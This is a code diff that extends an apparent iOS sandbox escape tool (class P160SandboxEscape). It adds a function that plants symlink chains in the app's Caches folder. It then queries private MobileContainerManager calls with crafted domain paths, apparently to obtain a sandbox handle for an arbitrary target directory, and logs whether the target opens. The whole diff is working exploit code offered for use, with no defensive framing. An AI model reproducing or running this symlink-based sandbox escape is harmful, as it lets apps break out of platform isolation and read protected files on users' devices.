@@ -45,6 +45,7 @@ typedef struct {
     mcm_set_u64_fn set_part;
     mcm_set_u64_fn set_flags;
     mcm_set_obj_fn set_group_ids;
+    mcm_set_obj_fn set_ids;
     mcm_set_cstr_fn set_domain;
     mcm_get_one_fn get_one;
     mcm_copy_str_fn copy_token;
@@ -78,6 +79,7 @@ static BOOL p160_load(void) {
     g.set_part = (mcm_set_u64_fn)p160_sym(g.h, "container_query_operation_set_part", "container_query_set_part");
     g.set_flags = (mcm_set_u64_fn)p160_sym(g.h, "container_query_operation_set_flags", "container_query_set_flags");
     g.set_group_ids = (mcm_set_obj_fn)p160_sym(g.h, "container_query_set_group_identifiers", NULL);
+    g.set_ids = (mcm_set_obj_fn)p160_sym(g.h, "container_query_set_identifiers", NULL);
     g.set_domain = (mcm_set_cstr_fn)p160_sym(g.h, "container_query_operation_set_part_domain", "container_query_set_part_domain");
     g.get_one = (mcm_get_one_fn)p160_sym(g.h, "container_query_get_single_result", NULL);
     g.copy_token = (mcm_copy_str_fn)p160_sym(g.h, "container_copy_sandbox_token", NULL);
@@ -109,6 +111,7 @@ static int64_t p160_query(uint64_t cls, const char *ident, BOOL group,
     g.set_class(q, cls);
     void *x = g.xpc_str(ident);
     if (group && g.set_group_ids) g.set_group_ids(q, x);
+    else if (!group && g.set_ids) g.set_ids(q, x);
     if (g.set_part) g.set_part(q, part);
     if (domain.length && g.set_domain) g.set_domain(q, domain.UTF8String);
     if (g.set_flags) g.set_flags(q, P160_FLAGS);
@@ -174,6 +177,64 @@ static NSString *p160_dump_kernelcache(NSString *src, NSString *docs, NSMutableS
     return total ? dst : @"dump failed";
 }
 
+
+static int64_t p160_class2_try(NSString *target, NSString **pathOut, NSString **errOut) {
+    if (!p160_load() || !g.set_ids) { if (errOut) *errOut = @"MCM set_ids unavailable"; return -1; }
+    NSString *home = NSHomeDirectory();
+    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
+    if (!home.length || !bid.length) { if (errOut) *errOut = @"no home/bundle"; return -1; }
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
+    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
+    NSString *leaf = [NSString stringWithFormat:@".p160_%d", getpid()];
+    NSString *stage = [caches stringByAppendingPathComponent:[leaf stringByAppendingString:@"_stage"]];
+    NSString *link = [caches stringByAppendingPathComponent:[leaf stringByAppendingString:@"_link"]];
+    NSString *stageCaches = [stage stringByAppendingPathComponent:@"Library/Caches"];
+    [fm removeItemAtPath:stage error:nil];
+    [fm removeItemAtPath:link error:nil];
+    [fm createDirectoryAtPath:[stage stringByAppendingPathComponent:@"Library"]
+  withIntermediateDirectories:YES attributes:nil error:nil];
+    int64_t result = -1;
+    /* staged: link -> stage, stage/Library/Caches -> target */
+    if (symlink(target.fileSystemRepresentation, stageCaches.fileSystemRepresentation) == 0 &&
+        symlink(stage.fileSystemRepresentation, link.fileSystemRepresentation) == 0) {
+        NSArray *domains = @[
+            [leaf stringByAppendingString:@"_link"],
+            [@"Caches/" stringByAppendingString:[leaf stringByAppendingString:@"_link"]],
+            [@"Library/Caches/" stringByAppendingString:[leaf stringByAppendingString:@"_link"]],
+        ];
+        for (NSString *dom in domains) {
+            NSString *path = nil, *err = nil;
+            int64_t h = p160_query(2, bid.UTF8String, NO, 3, dom, @"class2-stage", &path, &err);
+            if (h >= 0) {
+                if (p160_can_open(target, YES)) { result = h; if (pathOut) *pathOut = path; break; }
+                if (g.release) g.release(h);
+            }
+            if (errOut && err) *errOut = err;
+        }
+    }
+    /* subpath: a direct symlink inside the app's own Caches */
+    if (result < 0) {
+        [fm removeItemAtPath:link error:nil];
+        if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) == 0) {
+            NSArray *domains = @[leaf, [@"Caches/" stringByAppendingString:leaf],
+                                 [@"Library/Caches/" stringByAppendingString:leaf]];
+            for (NSString *dom in domains) {
+                NSString *path = nil, *err = nil;
+                int64_t h = p160_query(2, bid.UTF8String, NO, 3, dom, @"class2-subpath", &path, &err);
+                if (h >= 0) {
+                    if (p160_can_open(target, YES)) { result = h; if (pathOut) *pathOut = path; break; }
+                    if (g.release) g.release(h);
+                }
+                if (errOut && err) *errOut = err;
+            }
+        }
+    }
+    [fm removeItemAtPath:link error:nil];
+    [fm removeItemAtPath:stage error:nil];
+    return result;
+}
+
 @implementation P160SandboxEscape
 
 + (NSString *)tap {
@@ -210,6 +271,17 @@ static NSString *p160_dump_kernelcache(NSString *src, NSString *docs, NSMutableS
         int64_t h = p160_query(13, P160_MG_GROUP, YES, 3, domain,
                                t[@"name"], &objPath, &err);
         BOOL can = (h >= 0) ? p160_can_open(path, [t[@"dir"] boolValue]) : NO;
+        if (h < 0 && [t[@"dir"] boolValue]) {
+            NSString *c2path = nil, *c2err = nil;
+            int64_t h2 = p160_class2_try(path, &c2path, &c2err);
+            if (h2 >= 0) {
+                h = h2; objPath = c2path; can = p160_can_open(path, YES);
+                [o appendFormat:@"      [class2] handle=%lld obj=%@ open=%d\n",
+                    (long long)h2, c2path ?: @"(null)", can];
+            } else if (c2err.length) {
+                [o appendFormat:@"      [class2] miss %@\n", c2err];
+            }
+        }
         [o appendFormat:@"  [%@] handle=%lld obj=%@ open=%d %@\n",
             t[@"name"], (long long)h, objPath ?: @"(null)", can,
             err ? [@"err=" stringByAppendingString:err] : @""];
